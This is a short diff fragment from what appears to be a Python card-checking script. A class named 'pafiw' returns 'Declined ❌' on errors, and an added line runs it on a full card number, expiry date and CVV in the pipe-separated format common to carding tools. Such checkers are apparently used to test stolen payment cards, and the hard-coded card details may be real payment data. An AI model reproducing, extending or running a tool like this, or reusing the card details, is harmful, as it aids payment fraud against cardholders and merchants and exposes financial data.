             else:
@@ -340,3 +339,4 @@ class pafiw:
         except Exception as e:
             print(e)
             return 'Declined ❌', str(e)
+print(pafiw().main('4110905024362674|09|2029|125'))
